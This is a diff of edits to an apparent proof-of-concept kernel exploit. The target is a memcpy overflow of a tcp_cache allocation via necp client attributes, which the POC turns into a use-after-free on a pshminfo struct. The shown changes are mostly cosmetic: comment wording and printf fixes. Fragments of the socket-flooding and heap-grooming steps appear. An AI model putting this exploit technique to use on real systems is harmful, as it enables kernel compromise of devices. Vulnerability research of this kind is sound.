@@ -2,6 +2,7 @@
 //user-supplied length is passed to memcpy, which causes the destination struct tcp_cache allocation to be overflown.
 //Unfortunately, the size of the source memory object is limited, so we cannot directly control the contents copied to the
 //overflown area.  The source memory object is on the stack (tfo_cache_buffer in necp_client_update_cache).
+//This POC uses this vulnerability to trigger a use-after-free condition on a pshminfo struct.
 //
 //The stack trace at the time of the overflow is:
 //tcp_cache_set_cookie_common
@@ -261,7 +262,7 @@ static void prep_attribute_flood(int number)
 
 	if(number > MAX_SOCKETS)
 	{
-		printf("Can't ask for more than %d sockets (asked for %d\n", MAX_SOCKETS, number);
+		printf("Can't ask for more than %d sockets (asked for %d)\n", MAX_SOCKETS, number);
 		exit(1);
 	}
 
@@ -277,7 +278,7 @@ static void prep_attribute_flood(int number)
 	}
 }
 
-//Set an attribute's necp attribute strings
+//Set a socket's necp attribute strings
 static inline void set_attributes_with_content(int sock, int num_attributes, int length, char * content, char * content2)
 {
 	struct tlv * value, * current;
@@ -320,7 +321,7 @@ static void close_sockets(int number)
 
 	if(number > MAX_SOCKETS)
 	{
-		printf("Can't ask for more than %d sockets (asked for %d\n", MAX_SOCKETS, number);
+		printf("Can't ask for more than %d sockets (asked for %d)\n", MAX_SOCKETS, number);
 		exit(1);
 	}
 
@@ -580,7 +581,7 @@ int main(int argc, char ** argv)
 		if(argc > 2)
 			socket_port_num = atoi(argv[2]);
 	}
-	printf("Running exploit from process %d using ip %s:%d\n", getpid(), sockets_ip, socket_port_num);
+	printf("Running from process %d using ip %s:%d\n", getpid(), sockets_ip, socket_port_num);
 
 	//Step 0: Update the file descriptor limit so we can flood our heap region
 	rlp.rlim_cur = 10240;
